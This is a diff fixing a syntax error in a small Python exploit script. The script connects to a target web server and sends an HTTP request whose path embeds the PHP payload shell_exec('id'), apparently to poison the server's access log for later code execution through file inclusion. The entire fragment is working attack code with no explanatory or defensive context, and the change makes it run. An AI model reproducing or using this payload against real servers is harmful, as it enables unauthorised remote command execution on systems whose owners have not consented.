@@ -9,6 +9,6 @@ if len(sys.argv) != 2:
   
 taint="GET /<?php echo shell_exec('id');?> HTTP/1.1\r\n\r\n"
 s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
-s.connect((sys.argv{1],80))
+s.connect((sys.argv[1],80))
 s.send(taint)
 s.close()
